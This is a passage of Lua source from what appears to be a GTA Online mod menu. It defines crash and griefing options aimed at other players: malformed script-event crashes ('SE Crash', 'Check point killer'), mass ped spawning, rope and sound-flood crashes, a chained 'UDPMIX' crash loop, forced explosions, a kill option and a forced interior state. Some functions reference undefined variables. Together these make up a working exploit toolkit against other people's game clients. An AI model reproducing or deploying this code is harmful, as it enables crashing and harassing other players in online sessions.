        PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
        util.yield(5000)
        --NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
        util.yield()
        --PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
        entities.delete_by_handle(new_ped)
        v3.free(pos)
    end)
end)

menu.action(newcrash, "Bad Head Blend v2", {""}, "", function()
    local outfit_component_table = {}
    local outfit_component_texture_table = {}
    local outfit_prop_table = {}
    local outfit_prop_texture_table = {}
    for i = 0, 11 do
        outfit_component_table[i] = PED.GET_PED_DRAWABLE_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), i)
        outfit_component_texture_table[i] = PED.GET_PED_TEXTURE_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), i)
    end
    for i = 0, 2 do
        outfit_prop_table[i] = PED.GET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), i)
        outfit_prop_texture_table[i] = PED.GET_PED_PROP_TEXTURE_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), i)
    end
    BlockSyncs(pid, function()
        local time = (util.current_time_millis() + 5000)
        while time > util.current_time_millis() do
            util.yield(10)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 0, 17, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 1, 55, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 2, 40, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 3, 44, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 4, 31, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 5, 0, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 6, 24, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 7, 110, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 8, 55, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 9, 9, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 10, 45, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), 11, 69, math.random(0, 50), 0)
            PED.SET_PED_HEAD_BLEND_DATA(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
        end
        util.yield(200)
        for i = 0, 11 do
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), i, outfit_component_table[i], outfit_component_texture_table[i], 0)
        end
        for i = 0, 2 do
            PED.SET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid()), i, outfit_prop_table[i], outfit_prop_texture_table[i], 0)
        end
        util.toast("Finished")
    end)
end)


menu.action(newcrash, "Host Crash v1", {""}, "", function()
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 10841.274, -6928.6284, 1.0732422, true, false, false, false)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
end)

menu.action(newcrash, "Host Crash v2", {"hostcrash"}, "", function()
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, -6169.9453, 10836.955, 39.99597, true, false, false, false)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
end)

menu.action(newcrash, "Host Pedswap Crash", {""}, "", function()
    local mdl = util.joaat("mp_m_freemode_01")
    STREAMING.REQUEST_MODEL(mdl)
    local usr = players.user()
    local pos = (ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    local old_ped = players.user_ped()
    util.yield(500)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(new_ped, -6170, 10835, 40, true, false, false, false)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(new_ped)
    util.yield(500)
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
end)


menu.click_slider(newcrash, "Global Crash", {"soundcrash"}, "", 1, 4, 1, 1, function(slider)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local time = util.current_time_millis() + 2000
    if slider == 1 then
        while time > util.current_time_millis() do
            for i = 1, 5 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "ROUND_ENDING_STINGER_CUSTOM", pos.x, pos.y, pos.z, "CELEBRATION_SOUNDSET", true, 999999999, false)
            end
            util.yield()
        end
    elseif slider == 2 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '10s', pos.x, pos.y, pos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 999999999, false)
            end
        util.yield()
    end
    elseif slider == 3 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Oneshot_Final', pos.x, pos.y, pos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 999999999, false)
            end
        util.yield()
    end
    elseif slider == 4 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", pos.x, pos.y, pos.z, "MP_MISSION_COUNTDOWN_SOUNDSET", true, 999999999, false)
            end
            util.yield()
        end
    end
end)

menu.click_slider(newcrash, "Controlled Crash", {"soundcrash2"}, "", 1, 3, 1, 1, function(slider)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local time = util.current_time_millis() + 2000
    if slider == 1 then
        while time > util.current_time_millis() do
            for i = 1, 5 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Object_Dropped_Remote", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
        util.yield()
    end
    elseif slider == 2 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Checkpoint_Cash_Hit", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
        util.yield()
    end
    elseif slider == 3 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
            util.yield()
        end
    end
end)


menu.action(newcrash, "Crash Cam Off", {}, "", function()
    menu.trigger_commands("anticrashcamera off")
end)


menu.action(newcrash, "Contract Franklin", {"crashv3"}, "", function()
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid())
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

    STREAMING.REQUEST_MODEL(0xAF10BD56)
    while not STREAMING.HAS_MODEL_LOADED(0xAF10BD56) do
        util.yield()
    end

    menu.trigger_commands("lodscale 0")
    menu.trigger_commands("invisibility on")
    menu.trigger_commands("otr")

    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z + 100)
    local peds = {}
    for i = 1, 70 do
        peds[i] = entities.create_ped(3, 0xAF10BD56, pos, 0)
        util.yield()
    end

    util.yield(3000)
    for i = 1, #peds do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
        entities.delete_by_handle(peds[i])
    end
    menu.trigger_commands("lodscale 1")
    menu.trigger_commands("invisibility off")
    menu.trigger_commands("otr")
end)

menu.action(newcrash, "Trevor Spam", {"crashv2"}, "", function()
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid())
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

    STREAMING.REQUEST_MODEL(-1686040670)
    while not STREAMING.HAS_MODEL_LOADED(-1686040670) do
        util.yield()
    end

    menu.trigger_commands("lodscale 0")
    menu.trigger_commands("invisibility on")
    menu.trigger_commands("otr")

    local peds = {}
    for i = 1, 100 do
        peds[i] = entities.create_ped(3, -1686040670, pos, 0)
        util.yield()
    end

    util.yield(3000)
    for i = 1, #peds do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
        entities.delete_by_handle(peds[i])
    end
    menu.trigger_commands("lodscale 1")
    menu.trigger_commands("invisibility off")
    menu.trigger_commands("otr")
end)


    local krusty = menu.list(newcrash, "Barbell crash", {}, "")

    local ents = {}
    local thingy = false
        
        menu.toggle(krusty, "funny", {}, "", function(val,cl)
            thingy = val
            BlockSyncs(pid, function()
                if val then
                    local number_of_things = 30
                    local ped_mdl = util.joaat("ig_siemonyetarian")
                    local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    local ped_pos = ENTITY.GET_ENTITY_COORDS(ply_ped)
                    ped_pos.z += 3
                    request_model(ped_mdl)
                    for i=1,number_of_things do
                        local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                        ents[i] = ped
                        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                        ENTITY.SET_ENTITY_VISIBLE(ped, false)
                    end
                    repeat
                        for k, ped in ents do
                            TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                            TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_SEAT_MUSCLE_BENCH_PRESS", 0, false)
                           
                            
                           
                        end
                        for k, v in entities.get_all_objects_as_pointers() do
                            if entities.get_model_hash(v) == util.joaat("ig_siemonyetarian") then
                                
                                
                         
                                entities.delete_by_pointer(v)
                            end
                        end
                       
                            
                        
                        util.yield_once()
                        util.yield_once()
                    until not (thingy and players.exists(pid))
                    thingy = false
                    for k, obj in ents do
                        entities.delete_by_handle(obj)
                    end
                    ents = {}
                else
                    for k, obj in ents do
                        entities.delete_by_handle(obj)
                    end
                    ents = {}
                end
            end)
        end)

menu.action(newcrash,"Lesbian Beyblade", {""} ,"" , function(pid)
    local Coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local Coords2 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    Coords2.z = Coords2.z + 1

    local cat = util.joaat("Cat")

    while not STREAMING.HAS_MODEL_LOADED(cat) do
        STREAMING.REQUEST_MODEL(cat)
        util.yield()
    end

    local cat1 = entities.create_ped(0, topless1, Coords2, 0.0)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(cat, cat1, 1, 0, 0.1, 0, 0, -90, 180, 90, 0, 0, 0, 0, 0)
    Rope = PHYSICS.ADD_ROPE(Coords.x, Coords.y, Coords.z, 1, 1, 1, 1, 1, 0.001, 1, 1, true, true, true, 1.0, true, 0)

    local CoordsC = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local CoordsP = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

    PHYSICS.ATTACH_ENTITIES_TO_ROPE(Rope, cat1, cat1, CoordsC.x, CoordsC.y, CoordsC.z, CoordsP.x, CoordsP.y, CoordsP.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    entities.delete_by_handle(Ped1)
    entities.delete_by_handle(Ped2)
    local temp = memory.alloc(4)
    memory.write_int(temp, Rope)
    PHYSICS.DELETE_ROPE(temp)
    memory.free(temp)
    util.yield()
end)

menu.action(newcrash,"R0 Crash", {"crashv3"} ,"" , function(pid)
    local pos = players.get_position(pid)
    PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
end)

menu.action(newcrash, "SE Crash", {"crashv4"}, "", function()
    util.trigger_script_event(1 << pid, {-555356783, pid, 0,  1,  21,  118276556,  24659,  23172,  -1939067833,  -335814060,  86247})
    util.trigger_script_event(1 << pid, {526822748, pid, 0,  1,  65620017,  232253469,  121468791,  47805193,  513514473,})
    util.trigger_script_event(1 << pid, {495813132, pid,  0,  1,  23135423,  3,  3,  4,  827870001,  5,  2022580431,  6,  -918761645,  7,  1754244778,  8,  827870001,  9, 17})
    util.trigger_script_event(1 << pid, {1348481963, pid,1348481963,  0,  1,  0,  2,  -18386240})
end)

menu.action(newcrash, "Check point killer", {"crashv5"}, "", function()
    for i = 1, 200 do
        util.trigger_script_event(1 << pid, {-1529596656, pid, -547323955  , math.random(0, 4), math.random(0, 1), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647),
        math.random(-2147483647, 2147483647), pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    end
end)

menu.toggle_loop(newcrash, "UDPMIX", {"mix"}, "", function()
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Starting...")
        menu.trigger_commands("crash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("smash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("choke" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("flashcrash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("ngcrash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("steamroll" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("footlettuce" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("choke" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("smash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("crashv5" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(1000)
        menu.trigger_commands("anticrashcamera off")
end)


--------------------------------------------------------------------------------------------------------------------------------------
    menu.toggle(Plyrveh_list, "Attach to player", {"attachto"}, "Useful, because if you\'re near the player your trolling works better", function(on)
        if on then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        else
            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
        end
    end, false)

    menu.action(newcrash, "Ultimate Ruiner", {}, "", function ()
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local jesus = util.joaat("ig_agent")
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local SelfPlayerPos = players.get_position(pid)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        BlockSyncs(pid, function()
            request_model(jesus)
            jesus_ped = entities.create_ped(26, jesus, SelfPlayerPos, -1)
            util.yield(200)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(Ruiner2), pid, true)
            util.yield(200)
            PED.SET_PED_INTO_VEHICLE(jesus_ped, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y+10, SelfPlayerPos.z+10, false, true, true)
            util.yield(200)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_start_gate_01b"))
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            -- TASK.TASK_VEHICLE_TEMP_ACTION(jesus_ped,Ruiner2,18) 
            util.yield(2000)
            entities.delete_by_handle(Ruiner2)
            entities.delete_by_handle(jesus_ped)
        end)
    end)
    

    menu.toggle_loop(Plyrveh_list,"Annoy 3000", {""} ,"" , function()
        uwu(pid)
        util.yield(100)
    end)

    menu.toggle_loop(newcrash, "Nuke Explosions", {}, "Nuke the player", function() --anonym nuke
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 0, 0)
        local defx = 0
        local defy = 0
        local defz = 0
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defx = defx + 2
        defy = defy + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end)

    menu.action(Plyrveh_list, "Kill Player Inside Casino", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        if get_interior_player_is_in(pid) ~= 275201 then
            util.toast("Player is not in casino. :/")
        elseif get_interior_player_is_in(players.user()) ~= 275201 then
            util.toast("You are not in the casino. :/")
        end
        if get_interior_player_is_in(pid) == 275201 and get_interior_player_is_in(players.user()) == 275201 then
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("WEAPON_STUNGUN_MP"), players.user_ped(), false, true, 1.0)
        end
    end)

    menu.toggle(Plyrveh_list, "Glitch Vehicle", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("p_spinning_anus_s")
        STREAMING.REQUEST_MODEL(glitch_hash)
        while not STREAMING.HAS_MODEL_LOADED(glitch_hash) do
            util.yield()
        end
        if not PED.IS_PED_IN_VEHICLE(player, PED.GET_VEHICLE_PED_IS_IN(player), false) then
            util.toast("Player isn't in a vehicle. :/")
            return
        end
        glitched_object = entities.create_object(glitch_hash, playerpos)
        ENTITY.SET_ENTITY_VISIBLE(glitched_object, false)
        ENTITY.SET_ENTITY_INVINCIBLE(glitched_object, true)
        ENTITY.SET_ENTITY_COLLISION(glitched_object, true, true)
        util.yield(100)
        entities.delete_by_handle(glitched_object)
        util.yield()
    end)

    menu.action(Plyrveh_list, "Transaction Error", {}, "Pretty inconsistent but whatever", function()
        if SCRIPT._GET_NUMBER_OF_REFERENCES_OF_SCRIPT_WITH_NAME_HASH(util.joaat("am_destroy_veh")) == 0 then
            util.request_script_host("freemode")
            while players.get_script_host() ~= players.user() do util.yield_once() end
            local sscript = menu.ref_by_path("Online>Session>Session Scripts>Run Script>Removed Freemode Activities>Destroy Vehicle")
            menu.trigger_command(sscript)
            while SCRIPT._GET_NUMBER_OF_REFERENCES_OF_SCRIPT_WITH_NAME_HASH(util.joaat("am_destroy_veh")) == 0 do
                util.yield(1000)
            end
        end
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(225) == 0 and 348 or 225
        local coords = get_blip_coords(blip)
        local explodeTargetVeh = function()
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
            local handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            local oldPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
            ENTITY.SET_ENTITY_COORDS(handle, coords.x, coords.y + 20, coords.z, false, false, false, false)
            util.yield(1000)
            coords = get_blip_coords(blip)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
            handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS(handle, oldPos.x, oldPos.y, oldPos.z, false, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
        end
        if coords.x ~= 0 and coords.y ~= 0 and coords.z ~= 0 then
            explodeTargetVeh()
        else
            util.yield(2500)
            coords = get_blip_coords(blip)
            while coords.x == 0 do
                coords = get_blip_coords(blip)
                util.yield_once()
            end
            explodeTargetVeh()
        end
    end)

    menu.action(Plyrveh_list, "Force Interior State", {}, "Can Be Undone By Rejoining. Player Must Be In An Apartment", function(s)
        if is_player_in_interior(pid) then
            util.trigger_script_event(1 << pid, {-1338917610, pid, pid, pid, pid, math.random(-2147483647, 2147483647), pid})
        else
            util.toast("Player isn't in an apartment. :/")
        end
    end)

    menu.action(Plyrveh_list, "Disable Explosive Projectiles", {}, "Will Disable Explosive Projectiles For The Player.", function(toggle) 
        local baseball = util.joaat("weapon_ball")
        STREAMING.REQUEST_MODEL(baseball)
        local id = PLAYER.PLAYER_PED_ID()
        local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for i = 1, 70 do
            WEAPON.GIVE_WEAPON_TO_PED(id, baseball, 1, false, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(coords.x, coords.y, coords.z + 5, coords.x, coords.y, coords.z + 5, 0, true, util.joaat("WEAPON_BALL"), PLAYER.PLAYER_PED_ID(), false, true, 0, ped, 0)
        end
        util.yield(500)
        MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 400, 0)
    end)
end)

players.dispatch_on_join()
util.keep_running()